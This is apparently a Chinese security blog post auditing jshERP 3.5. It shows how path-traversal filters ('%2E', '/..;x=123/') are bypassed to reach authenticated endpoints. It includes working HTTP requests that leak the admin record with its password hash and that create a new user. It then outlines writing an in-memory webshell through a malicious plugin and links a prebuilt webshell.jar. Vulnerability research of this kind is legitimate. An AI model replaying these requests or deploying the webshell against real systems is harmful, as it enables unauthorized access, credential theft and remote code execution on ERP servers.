---
title: jshERP3.5漏洞分析
tags:
  - 代码审计
  - CVE
  - java
date: 2025-09-05
---

# 环境
起个redis，起个mysql，然后插入数据。怎么装这个yarn的我记不清了，
```
yarn run serve
```

# 第一次绕过
首先看官方的commit记录。
https://github.com/jishenghua/jshERP/commit/a32d453d07845a1ffd6546ffc3e36bdf380bdc34
![image-20250903182536934](https://cocr-obsidian.oss-cn-beijing.aliyuncs.com/_typora_image/image-20250903182536934.png)

此处过滤了`%2e`没过滤`%2E`等于没过滤。而且这种url处的 类似于目录穿越的地方，其实大概率就是发生越权了。

然后查找资料发现确实存在过历史安全问题。但是这里面的这个链接里面的poc已经不能用了。 

https://rivers.chaitin.cn/blog/cr6te1h0lne84lm7489g

但是可以推测相关的路由在这里面实现 src/main/java/com/jsh/erp/controller/UserController.java `/user/getAllList` 这个接口已经被删除了。

我们看看还有什么可以利用的接口，发现了一个。

```java
    @GetMapping(value = "/info")
    @ApiOperation(value = "根据id获取信息")
    public String getList(@RequestParam("id") Long id,
                          HttpServletRequest request) throws Exception {
        User user = userService.getUser(id);
        Map<String, Object> objectMap = new HashMap<>();
        if(user != null) {
            objectMap.put("info", user);
            return returnJson(objectMap, ErpInfo.OK.name, ErpInfo.OK.code);
        } else {
            return returnJson(objectMap, ErpInfo.ERROR.name, ErpInfo.ERROR.code);
        }
    }
```

直接构造exp就行。获取管理员相关信息。这里管理员的id比较固定。

```
GET /jshERP-boot/webjars/swagger-ui/css/%2E%2E/%2E%2E/%2E%2E/user/info?id=120 HTTP/1.1
Host: 192.168.58.1:3000
Accept: *
```

`{"code":200,"data":{"message":"成功","info":{"deleteFlag":"0","id":120,"ismanager":1,"isystem":0,"leaderFlag":"0","loginName":"admin","password":"e10adc3949ba59abbe56e057f20f883e","status":0,"tenantId":0,"username":"管理员"}}}`

密码虽然是加密的，这里直接劫持登入数据包然后就可以登入后台了。

# 补丁绕过

然后官方的又一次补丁。过滤了`%2E` ,然后 /user/info 那个接口多做了一步鉴权。

https://github.com/jishenghua/jshERP/commit/fbda24da30997df1f642a1878272d7278ccd94ce

依旧可以绕过 `/..;x=123/`

然后继续从这个控制器里面找一个利用接口就行。

src/main/java/com/jsh/erp/controller/UserController.java

可以本地搭建个环境，看看这个新增用户的数据包是什么样子的。

```java
    @PostMapping("/addUser")
    @ApiOperation(value = "新增用户")
    @ResponseBody
    public Object addUser(@RequestBody JSONObject obj, HttpServletRequest request)throws Exception{
        JSONObject result = ExceptionConstants.standardSuccess();
        User userInfo = userService.getCurrentUser();
        Tenant tenant = tenantService.getTenantByTenantId(userInfo.getTenantId());
        Long count = userService.countUser(null,null);
        if(tenant!=null) {
            if(count>= tenant.getUserNumLimit()) {
                throw new BusinessParamCheckingException(ExceptionConstants.USER_OVER_LIMIT_FAILED_CODE,
                        ExceptionConstants.USER_OVER_LIMIT_FAILED_MSG);
            } else {
                UserEx ue= JSONObject.parseObject(obj.toJSONString(), UserEx.class);
                userService.addUserAndOrgUserRel(ue, request);
            }
        }
        return result;
    }
```

这里还有一个，但是这个在前端没有调用的地方。

```java
    @PostMapping(value = "/add")
    @ApiOperation(value = "新增")
    public String addResource(@RequestBody JSONObject obj, HttpServletRequest request)throws Exception {
        Map<String, Object> objectMap = new HashMap<>();
        int insert = userService.insertUser(obj, request);
        return returnStr(objectMap, insert);
    }
```

最后调用的mapper都一样。

```xml
  <insert id="insertSelective" parameterType="com.jsh.erp.datasource.entities.User">
    insert into jsh_user
    <trim prefix="(" suffix=")" suffixOverrides=",">
      <if test="id != null">
        id,
      </if>
      <if test="username != null">
        username,
      </if>
      <if test="loginName != null">
        login_name,
```



```
POST /jshERP-boot/user/addUser HTTP/1.1
Host: 192.168.58.1:3000
Origin: http://192.168.58.1:3000
Referer: http://192.168.58.1:3000/system/user
Accept: application/json, text/plain, */*
Content-Type: application/json;charset=UTF-8
X-Access-Token: 2083163897fb451cbda78df07b0a5503_63
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
Cookie: Hm_lvt_1cd9bcbaae133f03a6eb19da6579aaba=1755685294,1756893058; HMACCOUNT=B7445FF7DEAEC0CE; Hm_lpvt_1cd9bcbaae133f03a6eb19da6579aaba=1756901710
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36
Content-Length: 48

{"loginName":"qwe","username":"qwe","roleId":17}
```

然后就是传恶意插件写内存马了，和上面一样。

# 恶意插件

https://gitee.com/xiongyi01/springboot-plugin-framework-parent

https://github.com/pf4j/pf4j/releases/tag/release-3.1.0

这里随便找个模板，写入一些恶意代码自己打包就可以了。

我这里贴一个别的师傅打包好的恶意插件。

https://fushuling-1309926051.cos.ap-shanghai.myqcloud.com/webshell.jar

# 反思

核心还是在于这个权限的绕过。这里的鉴权为何能通过 `../` 的方式绕过，而且过略了 `../` 还会有很多新的绕过方式。这种越权的方式的底层原因是什么。
